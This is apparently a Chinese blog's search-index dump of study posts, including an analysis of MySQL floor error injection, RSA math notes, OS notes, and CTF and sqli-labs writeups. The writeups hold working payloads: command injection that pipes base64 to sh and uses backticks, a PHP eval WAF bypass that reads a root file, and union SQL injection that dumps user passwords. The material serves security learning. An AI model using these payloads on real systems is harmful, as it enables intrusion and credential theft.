count(),(floor(rand(0)2)) x from users group by x```这个相对固定的语句格式，导致的数据库报错。实际利用中通过 concat 函数，连接注入语句与 floor(rand(0)*2)函数，就实现了注入结果与报错信息回显的注入方式。具体利用本文不做阐述，本文重点探究该语句报错的原因，要理解该语句的报错原因，首先大家需要理解如下的关键函数的作用： count() 、group by 、floor()、rand()。","text":"原文地址 ：Mysql报错注入之floor(rand(0)*2)报错原理探究 作者首页 一、简述floor报错注入是利用 `select count(),(floor(rand(0)2)) x from users group by x```这个相对固定的语句格式，导致的数据库报错。实际利用中通过 concat 函数，连接注入语句与 floor(rand(0)*2)函数，就实现了注入结果与报错信息回显的注入方式。具体利用本文不做阐述，本文重点探究该语句报错的原因，要理解该语句的报错原因，首先大家需要理解如下的关键函数的作用： count() 、group by 、floor()、rand()。 二、关键函数说明理解rand函数rand() 是一个随机函数，通过一个固定的随机数的种子0之后，可以形成固定的伪随机序列。结果如下图所示： 可见，直接使用rand函数每次产生的数都不同，但是当提供了一个固定的随机数的种子0之后： 这样每次产生的值都是一样的。也可以称之为伪随机（产生的数据都是可预知的）。查看多个数据看一下。（users是一个有6行数据的表） 这样第一次产生的随机数和第二次完全一样，也就是可以预测的。那么floor报错注入利用的时候rand（0）*2为什么要乘以 2 呢？这就要配合floor 函数来说了。 理解floor(rand(0)*2)函数floor() 函数的作用就是返回小于等于括号内该值的最大整数，也就是取整。 floor(rand(0)*2）就是对rand(0)产生的随机序列诚意2后的结果，再进行取整。得到伪随机序列为如下图所示： 因为使用了固定的随机数种子0，他每次产生的随机数列都是相同的0 1 1 0 1 1的顺序。 group by函数group by 主要用来对数据进行分组（相同的分为一组）。 例如建立如下表进行实验 通过如下语句进行查询。（这里在a和x之前缺省了as ，作用为用a和x代替原有的字段显示），显示的结果如下图所示： 但通过group by进行分组排序是，结果会进行分组，相同名字为合并。如下图所示 注意：最后x这列中显示的每一类只有一次，前面的a的是第一次出现的id值 理解count（*）函数count**（*）统计结果的记录数。** 这里与group by结合使用看一下： 这里就是对a中的重复性的数据进行了整合，然后计数，后面的x就是每一类的数量。也就是lisi有2个，wangwu有1个，zhangsan有3个。注意显示同样是按照ascii排序。 三、报错原因分析大家已经了解，当执行如下语句时，就会产生一个报错。如下图所示 select count(*),floor(rand(0)*2) x from users group by x; 根据前面函数的理解，这句话本义就是统计后面产生随机数的种类并计算每种数量。原本执行结果一共6行数据，产生的随机序列应该为0 1 1 0 1 1 ，按照语句的含义，统计如果应该是：0是2个，1是4个，但是此处却产生了报错？这是为什么呢？下面来分析一下。 这里最关键的及时要理解group by函数的工作过程。group by key 在执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则更新临时表中的数据（更新数据时，不再计算rand值）；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。（插入数据时，会再计算rand值） 如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。 具体报错原因可以通过下列过程展示： mysql执行结果，会产生 011011 这个序列，group by时，会建立空虚拟表如下图，然后从sql语句执行结果序列（011011）读取数据并插入虚表: （1）虚表写入第一条记录，执行floor(rand(0)*2)，发现结果为0(此时为第一次计算) （2）查询虚拟表，发现0的键值不存在，则插入新的键值的时候floor(rand(0)*2)会被再计算一次，结果为1(此时为第二次计算)，插入虚表，第一条记录插入完毕，结果为1。如下图: （3）虚表写入第二条记录，再次计算floor(rand(0)2)，发现结果为1(此时为第三次计算)，此时结算结果为1，所以floor(rand(0)*2)不会被计算，直接count()加1，第二条记录写入完毕。（5）查询虚表，发现1的键值存在，所以floor(rand(0)2)不会被计算第二次，直接count()加1，第二条记录查询完毕，结果如下: （4）虚表写入第三条记录，再次计算floor(rand(0)2)，发现结果为0(此时为第4次计算)，计算结果为0，此时虚表中没有0的数据记录，则执行插入该数据，插入时会再次计算floor(rand(0)2)（此时为第5次计算），计算结果为1。然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以就产生了主键冲突的错误，也就是：Duplicate entry 的报错。 总结： 通过上述分析，在虚表中写入第三条记录是时，产生了报错。此时floor(rand(0)*2)一共被计算了5次，这也解释了为什么数据表中需要最少3条数据才会报错的原因。 另外，要注意加入随机数种子的问题，如果没加入随机数种子或者加入其他的数，那么floor(rand()2)产生的序列是不可测的，这样可能会出现正常插入无法报错的情况。最重要的是前面几条记录查询后不能让虚表存在0,1键值，如果存在了，那无论多少条记录，也都没办法报错，因为floor(rand()2)不会再被计算做为虚表的键值，这也就是为什么不加随机数种子有时候会报错，有时候不会报错的原因。 比如下面用1作为随机数种子，就不会产生报错：","categories":[{"name":"security","slug":"security","permalink":"https://crlwebby.github.io/categories/security/"},{"name":"CTF","slug":"security/CTF","permalink":"https://crlwebby.github.io/categories/security/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://crlwebby.github.io/tags/CTF/"},{"name":"web安全","slug":"web安全","permalink":"https://crlwebby.github.io/tags/web%E5%AE%89%E5%85%A8/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://crlwebby.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"MYSQL","slug":"MYSQL","permalink":"https://crlwebby.github.io/tags/MYSQL/"},{"name":"转载","slug":"转载","permalink":"https://crlwebby.github.io/tags/%E8%BD%AC%E8%BD%BD/"}]},{"title":"转载声明","slug":"转载","date":"2021-01-24T14:04:47.000Z","updated":"2021-01-24T14:18:12.244Z","comments":true,"path":"规范/转载/","link":"","permalink":"https://crlwebby.github.io/%E8%A7%84%E8%8C%83/%E8%BD%AC%E8%BD%BD/","excerpt":"","text":"由于个人常常面向搜索引擎学习，所以会很容易见到好多好多写的很好的文章，但是又担心这些文章以后会被删除，于是决定转载到自己的博客内进行保存，虽然大多都没有取得本人的同意（感觉联系起来有点麻烦……），但是我打算在转载文章标题添加【转载】字样，然后在文章开始处添加作者账号主页和原文链接。 ​ 一：这些博文我只能放在收藏夹中，不能按标签归类，查询不方便 ​ 二：放置在个人博客中可以长久保存 ​ 三：互联网删帖见怪不怪了，只能尽力保存下自己喜欢的文章和内容 ​ 转载应该有更好的自动化方法生成，但是我不懂。同时，转载文章不会（以后不会，现在不知道怎么不会）出现在个人首页，只会在标签里或文章查询的地方看见它们。","categories":[{"name":"规范","slug":"规范","permalink":"https://crlwebby.github.io/categories/%E8%A7%84%E8%8C%83/"}],"tags":[]},{"title":"buuctf_web_1","slug":"buuctf-web-1","date":"2020-11-24T09:23:11.000Z","updated":"2021-02-02T06:35:40.757Z","comments":true,"path":"security/CTF/buuctf-web-1/","link":"","permalink":"https://crlwebby.github.io/security/CTF/buuctf-web-1/","excerpt":"","text":"​ 再开一个坑……算是刷buuctf系列的一个开篇吧。题目就这样随意过去了，主要是有些知识点进行记录，怕以后忘了。 GXYCTF2019 Ping Ping Ping​ 进去以后有提示用get输入IP，结合题目来看应该是命令执行。输入?ip=127.0.0.1;ls后验证猜想，用分号使得一句多行shell命令。 ​ 后来测试发现，空格和flag都被过滤了，无奈搜WP，发现IFS这个神奇的东西，于是 1payload:?ip=127.0.0.1;cat$IFS$1index.php 解释一下IFS是个什么东西吧。 IFS The Internal Field Separator that is used for word splitting after expansion and to split lines into words with the read builtin command. The default value is ``&lt;new‐ line&gt;’’. 也就是说，IFS是个分隔符，可以用于在表达式或行之间进行分割。默认的三个值是空格、tab、换行。 那么，根据shell的特殊变量列表： 变量 含义 $0 当前脚本文件名 $n 传递给脚本或函数的参数。n是一个数字，代表第几个参数。例如，第一个参数是$1,第二个是$2 $# 传递给脚本或函数的参数个数 $* 传递给脚本或函数的所有参数 $@ 传递给脚本或函数的所有参数。用双引号包裹时，与$*略有不同 $$ 当前shell进程ID。对于脚本而言，就是这些脚本所在的进程ID $? 上个命令的退出状态，或函数的返回值 那么$IFS$1的含义就是，取IFS的第一个元素，即默认值空格，实现空格绕过，顺利读取index.php 12345678910111213141516&lt;?php if(isset($_GET['ip']))&#123; if(preg_match(\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\", $ip, $match))&#123; echo preg_match(\"/\\&amp;amp;|\\/|\\?|\\*|\\&amp;lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&amp;gt;|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/\", $ip, $match); die(\"fxck your symbol!\"); &#125; else if(preg_match(\"/ /\", $ip))&#123; die(\"fxck your space!\"); &#125; else if(preg_match(\"/bash/\", $ip))&#123; die(\"fxck your bash!\"); &#125; else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip))&#123; die(\"fxck your flag!\"); &#125; $a = shell_exec(\"ping -c 4 \".$ip); echo \"print_r($a); &#125; ?&gt; 刚刚还在疑惑为什么显示出来的index.php是不完整的，转眼F12发现被注释了一部分…… 言归正传，根据正则，基本过滤了所有的尖括号引号等特殊符号，还过滤了包含空格、bash、flag，虽然我不是很懂为什么要过滤bash…… 把flag过滤了，那么拿什么读取flag呢？这是我的知识盲区，只好求助于wp。 根据网上找到的资料，有这样几种绕过方法： 1.利用base64 1?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 解释一下，echo后面那串字母是’cat flag.php’的base64加密密文，然后利用管道’|’传递给base64进行解密，再传递给sh执行（原来这里有点过滤bash的原因在了) 2.内联执行 1?ip=127.0.0.1;cat$IFS$1`ls` 就是将反引号里的ls执行，然后返回结果作为cat的参数，即可绕过flag的过滤 其它的有经过测试不可用的，有懒得测试的……就先记住这两个吧，其它的以后遇见了再看也不迟。 RoarCTF2019 Easy Calc​ 这题初遇的时候我其实是懵逼的，因为完全不知道如何着手，感觉像是命令执行，但是输入框输入字母就直接被过滤报错了，就很头疼。 ​ 后来看了WP，才发现原来那个AJAX送至的PHP文件可读……看见了calc.php，但没想到去读出来，惭愧 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET['num']))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/' . $blackitem . '/m', $str)) &#123; die(\"what are you want to do?\"); &#125; &#125; eval('echo '.$str.';');&#125;?&gt; GET方法获得num，然后过滤空格、\\t、\\r、\\n、单引号、双引号，反引号，左右中括号，美元符，斜杠，幂符号（在PHP里是异或运算符） 但是问题也就出在这里，当你用URL参数传num的时候，直接403forbidden，因为有WAF的存在，但是又不知道WAF规则…… 看WP，发现一个字符串解析的特性，简单来说就是GET的参数传到WAF的解析和传到PHP的解析是不一致的。比如‘ num’，在WAF里处理是’空格‘+’num‘，但是在PHP里，空格会被忽略掉，因此可以绕过WAF而不影响其在PHP中的语义。参考链接：利用PHP的字符串解析特性Bypass 123456789101112131415161718192021222324252627282930&lt;?phpforeach( [ \"&#123;chr&#125;foo_bar\", \"foo&#123;chr&#125;bar\", \"foo_bar&#123;chr&#125;\" ] as $k =&gt; $arg) &#123; for($i=0;$i&lt;=255;$i++) &#123; //echo \"\\033[999D\\033[K\\r\"; //echo \"[\".$arg.\"] check \".bin2hex(chr($i)).\"\"; parse_str(str_replace(\"&#123;chr&#125;\",chr($i),$arg).\"=bla\",$o); /* yes... I've added a sleep time on each loop just for the scenic effect :) like that movie with unrealistic brute-force where the password are obtained one byte at a time (∩｀-′)?━☆?.*??? */ usleep(5000); if(isset($o[\"foo_bar\"])) &#123; //echo \"\\033[999D\\033[K\\r\"; echo $arg.\" -&gt; \".bin2hex(chr($i)).\" (\".chr($i).\")\\n\"; &#125; &#125; //echo \"\\033[999D\\033[K\\r\"; echo \"\\n\"; &#125;?&gt; 简单来说，通过在’foo’和’bar’两个字符串的前、中、后三个位置，不断循环测试255个ASCII码，然后通过是否被忽略来判断是否有特殊的字符解析。如果字符在某个位置被忽略了，就会输出对应的ASCII码和符号。 最后一个应该是在输出.chr($i).”)\\n”时被截断了，因此直接下一行继续了。 可见，有些是可打印字符，有些是不可打印字符（%00），用这些字符套进num，就可以成功绕过，然后开始愉快地命令执行。值得一提的是，因为代码里是$o[“foo_bar”]，因此{chr}在中间时应该是被替换成下划线了。 个人测试，空格+num和+num两个都是可以的，&amp;不行，估计是被URL解析了。 1payload1:?+num&#x3D;1;var_dump(scandir(char(47))) 这里尝试过用echo和printf，但是echo被过滤了空格，而printf只输出了类型，于是还是用var_dump； (最新测试，print_r用于打印数组，也可以显示结果) 1payload2:?+num&#x3D;1;var_dump(file_get_contents(chr(47).f1aag)) chr(47)是右斜杠’/‘,即读出根目录下/f1aag的内容，顺利得到flag. 还有一种方法叫HTTP走私攻击，应该是非预期解……有空单开一篇，这个名词似乎图解HTTP遇见过，有空单独研究下。","categories":[{"name":"security","slug":"security","permalink":"https://crlwebby.github.io/categories/security/"},{"name":"CTF","slug":"security/CTF","permalink":"https://crlwebby.github.io/categories/security/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://crlwebby.github.io/tags/CTF/"},{"name":"web安全","slug":"web安全","permalink":"https://crlwebby.github.io/tags/web%E5%AE%89%E5%85%A8/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://crlwebby.github.io/tags/BUUCTF/"}]},{"title":"RSA详解","slug":"RSA-details","date":"2020-11-06T14:56:05.000Z","updated":"2021-02-02T06:57:56.752Z","comments":true,"path":"security/crypto/RSA-details/","link":"","permalink":"https://crlwebby.github.io/security/crypto/RSA-details/","excerpt":"","text":"RSA details起因​ 日常自闭=。=，做个中科大新生赛的RSA，然后把自己给气死了。去年寒假写的脚本，今年各种bug，然后自己RSA和数论|抽代内容也忘得都差不多了，就很烦躁，啥也不会。于是干脆整这样一篇博客，趁着这个双休日，把RSA好好的理解理解，也可以做为以后自己复习用。 使用​ 先把RSA怎么用给写出来，具体的后面可以慢慢解释$$首先是选取两个大质数p和q，然后计算p*q=n\\tag{Q1}$$ $$和(p-1)*(q-1)=\\phi(N)\\tag{Q2}$$ $$选取整数e（即公钥），使得e满足1&lt;e&lt;\\phi(N),(e,\\phi(n))=1\\tag{Q3}$$ $$则存在整数d（即私钥），使得ed\\equiv1\\pmod{\\phi(N)} \\tag{Q4}$$ PS: d也是e在某某里的逆元，这部分群环域的内容忘得差不多了。。。$$加密：：此时有明文m,使用公钥e进行加密，得到密文c(cipher)，c=m^e\\pmod{n}$$ $$解密：：此时有密文c，使用私钥d进行解密，得到明文m(message),m=c^d\\pmod{n}\\tag{Q5}$$ 这就是整体的使用流程，当然，这里有非常多的细节没有展示，仅仅是下次要用的时候急着拿来用罢了，不仅看客看不懂，我写的也云里雾里：凭什么啊？ Q question_detail Q1 涉及到RSA的根本原理，即大数分解问题：已知p、q，计算n很容易，但由n计算p、q非常困难 Q2 phi(N)是干什么用的？ Q3 为什么要(e,phi(N))=1? Q4 为什么存在d？如果存在，要如何计算d？ Q5 为什么能够顺利解密？ 原理​ 这里的本意是梳理自己有关数论的知识内容，尽可能的不学究，追随RSA的主线走。如果对Q1-Q5感兴趣的，上方表格内点击链接导向页面内容即可。 整除定义$$设a,b是任意两个整数，其中b\\not=0，如果存在一个整数q使得等式a=qb成立，则称b整除a或者a被b整除，记作b|a$$ 定理1$$设a,b,c\\not=0是三个整数，若c|a,c|b，则对任意整数s,t，有c|sa+tb$$ ​ 构造a=pc,b=qc即可 Euclid除法$$设a,b是两个整数，其中b&gt;0，则存在唯一的整数q,r使得a=qb+r,0\\leq r&lt;b$$ ​ 证明好像有点复杂==，不是很难懂，但也比较难想，有兴趣查资料吧23333 定理2*$$设a,b,c是三个不全为零的整数，如果a=qb+c,其中q是整数，则(a,b)=(b,c)$$ ​ PS:(a,b)表示a和b的最大公因数，这个符号应该目前是第一次出现。 ​ 这个定理非常重要，而且并不是十分直观，这也是后面扩展Euclid除法的基础。 ​$$设d=(a,b),d’=(b,c)，则d|a,d|b,于是d|a+(-q)b=c\\\\于是d|d’,因此d\\leq d’;\\\\同理，d’\\leq d，因此d=d’,即(a,b)=(b,c)$$ 广义Euclid除法​ 根据上面的a=qb+r以及（a,b)=(b,r)，可以进行不停的迭代，由于r是小于b的，所以r也会不停减小，直至为0.（a,b)为算式列中最后一个非零余数$$以a=737和b=635为例，求解(a,b)：\\\\737=1·635+102\\\\635=6·102+23\\\\102=4·23+10\\\\23=2·10+3\\\\10=3·3+1\\\\3=3·1+0\\\\最大公因数为1$$ 定理3$$设a,b是任意两个正整数，则s_n+t_nb=(a,b)\\\\s_-2=1,s_-1=0,s_j=s_{j-2}-q_js_{j-1}\\\\t_-2=0,s_-1=1,t_j=t_{j-2}-q_jt_{j-1}\\\\$$ $$以a=737和b=635为例，求s,t使得s·a+t·b=(a,b)\\\\\\begin{aligned}1&amp;=10-3·3\\\\&amp;=10-3·(23-2·10)\\\\&amp;=(-3)·23+7·(102-4·23)\\\\&amp;=7·102+(-31)·(635-6·102)\\\\&amp;=(-31)·635+193·(737-635)\\\\&amp;=193·737+(-224)·635\\\\\\end{aligned}$$ ​ 这个定理我也看不懂，尤其证明更是复杂，在我的教材上篇幅足足有两页之多，但是实际上操作起来十分易懂。就是从1(或者最大公因数)开始，不断地利用从前的等式代入，直至两个分量满足条件。证明很复杂，但对于理解RSA与否并没有影响，因此略去（其实是看不懂） 定理4$$整数a,b互素的充要条件是存在整数s,t,使得sa+tb=1$$ ​ 这个定理是根据定理3证的，但是感觉一般也用不太上，可以当成个性质。 算术基本定理$$任一整数n&gt;1都可以表示成素数的乘积，且在不考虑乘积顺序的情况下，该表达式是唯一的$$ 同余定义$$给定一个正整数m和两个整数a,b，若a-b被m整除或m|(a-b)，则a,b叫做模m同余，记作a\\equiv b;\\\\否则，叫做模m不同余，记作a\\not\\equiv b.$$ 几条定理$$1.（自反性）任一整数a,a\\equiv a\\pmod{m}\\\\2.(对称性) 若a\\equiv b\\pmod{m}，则b\\equiv a\\pmod{m}\\\\3.(传递性) 若a\\equiv b\\pmod{m},b\\equiv c\\pmod{m}，则a\\equiv c\\pmod{m}\\\\4.若a_1\\equiv b_1\\pmod{m},a_2\\equiv b_2\\pmod{m}，则\\\\i)a_1+b_1\\equiv b_1+b_2\\pmod{m},ii)a_1b_1\\equiv b_1b_2\\pmod{m}$$ ​ 这四条定理很普遍实用，而且很好证，都是从定义出发可得。$$设p,q是不同的素数，如果整数a,b满足a\\equiv b\\pmod{p},a\\equiv b\\pmod{q},则a\\equiv b\\pmod{pq}$$​ 这条也许有用……注意p、q互素就很容易得出结论了，记录一下。 Euler函数$$设m是一个正整数，则m个整数0，1，……，m-1中与m互素的整数的个数，记作\\phi(m),通常叫做Euler函数\\\\例：m=10,则[0-9]与m互素的数为1，3，7，9，所以\\phi(10)=4$$ 逆元定理$$设m是一个正整数，a是满足(a,m)=1的整数，则存在唯一的整数a’，1\\leq a’&lt;m，使得\\\\aa’\\equiv1\\pmod{m}$$ 这个证明的其中一个证法需要用到剩余系的知识，这个我也许会另开一个帖，在RSA实在塞不下了。 好在教材还不错，有另一个用广义Euclid除法的证明可以贴上来$$因为(a,m)=1,根据整除里的定理3，我们可以找到s,t,使得\\\\sa+tm=(a,m)=1\\\\两边同时模m即可得\\\\sa\\equiv1\\pmod{m},\\\\即a’\\equiv s\\pmod{m}满足aa’\\equiv1\\pmod{m}$$几个Euler函数的求解方法：$$1.m,n是互素的两个正整数，则\\\\\\phi(mn)=\\phi(m)\\phi(n)\\\\2.\\phi(p^{\\alpha})=p^{\\alpha}-p^{\\alpha -1}$$","categories":[{"name":"security","slug":"security","permalink":"https://crlwebby.github.io/categories/security/"},{"name":"crypto","slug":"security/crypto","permalink":"https://crlwebby.github.io/categories/security/crypto/"}],"tags":[{"name":"math","slug":"math","permalink":"https://crlwebby.github.io/tags/math/"},{"name":"RSA","slug":"RSA","permalink":"https://crlwebby.github.io/tags/RSA/"},{"name":"数论","slug":"数论","permalink":"https://crlwebby.github.io/tags/%E6%95%B0%E8%AE%BA/"}]},{"title":"Hackergame 2020 Writeup","slug":"Hackergame_2020_Writeup","date":"2020-11-03T14:34:53.000Z","updated":"2021-02-02T06:35:13.751Z","comments":true,"path":"security/CTF/Hackergame_2020_Writeup/","link":"","permalink":"https://crlwebby.github.io/security/CTF/Hackergame_2020_Writeup/","excerpt":"","text":"Hackergame 2020 Writeup​ 科大新生赛……不得不说自己就是菜啊。除了第一天是周六来得早，上波分最高到了四五十名，后面知识水平完全就跟不上，直接落到四五百名=。=（time:11.3 22:29) 超简单的世界模拟器​ 真是“超简单”的呢……当然，这题我估计大家的做法也都差不多。生命游戏很有意思，但这题本身感觉很无聊，单纯为了随手记录一下没见过的东西 ​ 总之，给出一个15*15的矩阵，画生命游戏图，然后上网找一下就有了，具体啥也都忘了，就疯狂找图，然后胡乱测试，就做出来了23333。 233同学的Docker​ 这题是我写WP的动力，研究了老半天总算搞定了，还从零攒了点docker的基础。 ​ 基础我也就不说了吧……直接开始，反正记录的是一些找的比较辛苦的资料。 ​ 拉下仓库后，docker history 可以看见flag.txt的删除记录 ​ ​ Docker镜像分层，最上面一层可读，其它层全部都是只读，但是我查了半天不知道怎么读…… ​ 而且似乎是那个ENTRYPOINT [“/bin/sh” “-c” “python /code/app.py”]的原因，尝试运行这个镜像时会自动输出一句nothing here然后终止容器的运行，现在想想感觉是一种另类的提示……因为进去了也找不到之前的镜像层。 1docker run -it --entrypoint sh [image_name] ​ 我还不懂entrypoint、ADD、CMD、COPY这些dockerfile的内容，但是根据这句命令可以进入这个镜像并启动sh shell，记录一下~ ​ 查找之前的镜像内容我是根据两个来的，第一是用dive分析镜像层内容，这个很容易找到，但是就是读不出内容……不过挺关键的是，这里面可以看见层细节（可能其它也有办法看见），对后面找文件帮助还是很大的。 ​ 第二呢，则是docker save命令，直接可以把镜像打包生成压缩文件。但是这个压缩文件的名字全是哈希值，就很烦躁 ​ ​ 后来发现哈希值刚好就是layer ID，于是dive派上用场了，根据ID找到文件夹，进去即能找到flag 从零开始的火星文生活​ 反正目前还是不理解……胡乱做出来的哈哈哈 12with open(\"gibberish_message.txt\",'rb') as f: print(f.read().decode().encode('gbk').decode('gbk')) ​ 先是读入bytes，用decode转换成strings，但是不知道为什么不能用gbk解码=。=，于是就默认decode，解码出来就是输入的字符串。再用encode编码成gkb bytes，再用gbk解码，为什么是不一样的字符串我也不知道23333，但是出来的那堆内容，扔进乱码恢复就出来flag了。","categories":[{"name":"security","slug":"security","permalink":"https://crlwebby.github.io/categories/security/"},{"name":"CTF","slug":"security/CTF","permalink":"https://crlwebby.github.io/categories/security/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://crlwebby.github.io/tags/CTF/"},{"name":"web安全","slug":"web安全","permalink":"https://crlwebby.github.io/tags/web%E5%AE%89%E5%85%A8/"},{"name":"Hackergame","slug":"Hackergame","permalink":"https://crlwebby.github.io/tags/Hackergame/"}]},{"title":"SQL注入靶场1","slug":"sqli-page1","date":"2020-09-26T01:36:37.000Z","updated":"2021-02-02T06:33:13.427Z","comments":true,"path":"security/CTF/sqli-page1/","link":"","permalink":"https://crlwebby.github.io/security/CTF/sqli-page1/","excerpt":"","text":"Preface​ 原本是用docker装的sqlib靶场，但是后来发现看源码有点麻烦，干脆还是localhost本地弄了。然后本地是xampp一体的环境，PHP版本与sqlib有点不匹配，就是原本是mysql的函数要全部换成mysqli，此外自己还把输入的SQL语句打印了出来便于理解，所以显示有些差异。 ​ 此外，这篇文章更多的是依据现有的sqlib的writeup写的，前半段因为不熟悉，更多偏重于对别人的payload的理解，仅用于记录感想。 ​ 【】标记代表知识点模糊，暂时还不能给出合理让人信服的答案，也许以后会填坑=。= Less-1​ 根据提示，用GET方法上传ID，发现存在注入点。用单引号测试报错。 ​ 可以尝试用union看当前库名，payload:?id=-1’ union select 1,2,database();–+ ​ 之所以使用-1，在根据源码或测试后可知，用mysqli_fetch_array()一次只返回一行数据【1】，故为了不挡住我们union想要的数据，于是将前面那个设为查不到结果的-1； ​ 其次，union查询的要求即两个查询表的列相同，根据测试可得select 1,2,database()返回三行数据，恰好匹配； ​ 后面跟着的–+，–是注释，+号是url中替代空格的字符。 单行注释可以使用–注释符，–注释符后需要加一个空格，注释才能生效。 至于#号为什么不行，暂时还不知道原因【2】 至此得出数据库名为security；那么怎么利用呢？我去看writeup了…… 1?id&#x3D;-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+ =。=，完全看不懂，导向另一个坑：mysql建立的information_schema数据库，学会了再继续~ information_schema是一个mysql自动维护的、只读的数据库，里面包含了mysql数据库内所有的信息，而我们只需要知道里面的两个表，一个是tables表，一个是columns表。这就是上面information_schema.tables的来源，下面也有information_schema.columns。 tables表： 字段 含义 Table_schema 数据表所属的数据库名称； table_name 数据表名称； columns表： 字段 含义 table_schema 数据表所属的数据库名称； table_name 数据表名称； column_name 列名称； 根据这些信息，我们就可以看懂上面那个writeup了，就是先找出security数据库中所有的表名，然后 1?id&#x3D;0&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; --+ 根据users表爆出所有列名，然后根据列名爆数据 1?id&#x3D;0&#39; union select 1,2,group_concat(username,0x3a,password) from users--+ 至此第一关结束。 Less-2​ 和第一关几乎一模一样。。。对比了源码，发现差异仅在于第一关的$id传入时用单引号封闭，第二关未做任何处理而已。 ​ BUT！有人说这是整型注入……不知道这是啥的我自然又去查了字符型注入和整型注入的概念== ​ 数字型注入/整形注入：查询参数为数字，传参进入时不需要引号，即?id=(int)； ​ 整形注入：查询参数为字符或字符串，?id=(string)； ​ 对于该题而言，也就是有无引号而判断出是否是整型注入； Less-3​ 同上，对比源码发现查询语句在Less-1的基础上加了一对括号，payload也就是在?id=0’后再多加个括号即可 Less-4​ 同上，传入的$id用(“$id”)进行包括，改一下即可","categories":[{"name":"security","slug":"security","permalink":"https://crlwebby.github.io/categories/security/"},{"name":"CTF","slug":"security/CTF","permalink":"https://crlwebby.github.io/categories/security/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://crlwebby.github.io/tags/CTF/"},{"name":"web安全","slug":"web安全","permalink":"https://crlwebby.github.io/tags/web%E5%AE%89%E5%85%A8/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://crlwebby.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"MYSQL","slug":"MYSQL","permalink":"https://crlwebby.github.io/tags/MYSQL/"}]},{"title":"自制操作系统-day3","slug":"OS-30-days-3","date":"2020-08-12T10:52:58.000Z","updated":"2021-02-02T06:34:45.192Z","comments":true,"path":"basic/OS/OS-30-days-3/","link":"","permalink":"https://crlwebby.github.io/basic/OS/OS-30-days-3/","excerpt":"","text":"","categories":[{"name":"basic","slug":"basic","permalink":"https://crlwebby.github.io/categories/basic/"},{"name":"OS","slug":"basic/OS","permalink":"https://crlwebby.github.io/categories/basic/OS/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://crlwebby.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"自制操作系统","slug":"自制操作系统","permalink":"https://crlwebby.github.io/tags/%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"白帽子讲Web安全-前言","slug":"web_security_before","date":"2020-07-14T15:47:13.000Z","updated":"2021-02-02T06:42:02.385Z","comments":true,"path":"security/Web/web_security_before/","link":"","permalink":"https://crlwebby.github.io/security/Web/web_security_before/","excerpt":"","text":"（本系列不属于教程，仅供作者本人复习参考，有不足之处欢迎指出） 黑客精神​ 最初的启蒙时代，以好奇心与求知欲为前进动力的初代黑客们，崇尚分享、自由、免费； ​ 黄金时代，以中美黑客大战为标志，黑客的独特魅力吸引了无数青少年学习； ​ 黑暗时代，安全产业发展以后，功利性质更加强，黑客精神消亡。 技术发展历程​ 最初大多是以攻击系统软件获取权限，虽然我不明白这是如何做到的。 ​ 但随着互联网发展以及对于端口限制、防火墙封锁等，互联网上的非Web服务越来越少，因此针对Web的攻击越来越多，也就越来越引人注目。 安全的本质​ 安全的本质是信任，越不信任的地方越要增加更多的限制。一般将信任域分为高信任域和低信任域。高信任域到低信任域不需要安全检查，反之则需要。","categories":[{"name":"security","slug":"security","permalink":"https://crlwebby.github.io/categories/security/"},{"name":"Web","slug":"security/Web","permalink":"https://crlwebby.github.io/categories/security/Web/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://crlwebby.github.io/tags/web%E5%AE%89%E5%85%A8/"},{"name":"白帽子学习笔记","slug":"白帽子学习笔记","permalink":"https://crlwebby.github.io/tags/%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"自制操作系统-day2","slug":"OS-30-days-2","date":"2020-07-14T00:10:53.000Z","updated":"2021-02-02T06:34:41.397Z","comments":true,"path":"basic/OS/OS-30-days-2/","link":"","permalink":"https://crlwebby.github.io/basic/OS/OS-30-days-2/","excerpt":"","text":"内容简介汇编的一些基础知识、makefile 汇编寄存器​ ​ 先是介绍了这些寄存器，通用寄存器和段寄存器都是16位的。 ​ 在此基础之上，还将4个数据寄存器分成8个8位寄存器，分法如下： ​ ​ 前8位为AH（ax high)，后八位为AL(ax low)。这也是高位计算机能够兼容低位计算机的原因。 ​ 注意：指针寄存器SP、BP和变址寄存器SI、DI不分高低位，也就是不能分成两个寄存器。 ​ 